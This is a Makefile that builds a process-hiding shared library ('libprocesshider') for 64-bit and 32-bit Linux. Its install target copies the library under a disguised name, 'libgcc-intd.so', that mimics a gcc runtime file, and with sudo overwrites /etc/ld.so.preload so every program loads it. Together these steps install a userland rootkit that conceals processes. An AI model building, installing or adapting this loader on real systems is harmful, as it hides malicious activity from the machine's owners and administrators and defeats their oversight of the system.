all: libprocesshider.so libprocesshider32.so

libprocesshider.so: processhider.c
	gcc -m64 -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
	strip $@

libprocesshider32.so: processhider32.c
	gcc -m32 -Wall -fPIC -shared -o libprocesshider32.so $< -ldl
	strip $@

.PHONY clean:
	rm -f *.o *.so

install: uninstall all
	sudo cp libprocesshider32.so /usr/local/lib/libgcc-intd.so
	sudo cp libprocesshider.so /usr/local/lib64/libgcc-intd.so
	#sudo bash -c 'grep ^/usr/local/\$$LIB/libgcc-intd.so /etc/ld.so.preload || echo /usr/local/\$$LIB/libgcc-intd.so >> /etc/ld.so.preload'
	sudo bash -c 'echo /usr/local/\$$LIB/libgcc-intd.so > /etc/ld.so.preload'
	cat /etc/ld.so.preload

uninstall:
	sudo bash -c "sed -i 's:^\(/usr/local/\$$LIB/libgcc-intd.so\):#\1:g' /etc/ld.so.preload"
	cat /etc/ld.so.preload
